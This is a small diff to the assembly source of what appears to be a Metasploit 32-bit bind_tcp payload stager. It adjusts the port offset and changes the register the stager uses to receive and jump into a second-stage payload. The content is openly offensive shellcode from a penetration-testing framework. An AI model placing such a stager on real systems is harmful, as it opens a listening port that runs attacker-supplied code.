@@ -26,7 +26,7 @@
 ; meta-connection-type=bind
 ; meta-name=bind_tcp
 ; meta-basemod=Msf::PayloadComponent::BindConnection
-; meta-offset-lport=0x1d
+; meta-offset-lport=0x1f
 ;
 ;;
 BITS   32
@@ -35,6 +35,7 @@ GLOBAL _start
 _start:
 
 initialization:
+	mov  ebp, esp
 	push dword 0xc3000700
 	mov  eax, 0x9a
 	cdq
@@ -80,7 +81,7 @@ read:
 	pop  eax
 	mov  dh, 0xc
 	push edx
-	push ebx
+	push ebp
 	push edi
 	call esi
-	jmp  ebx
+	jmp  ebp
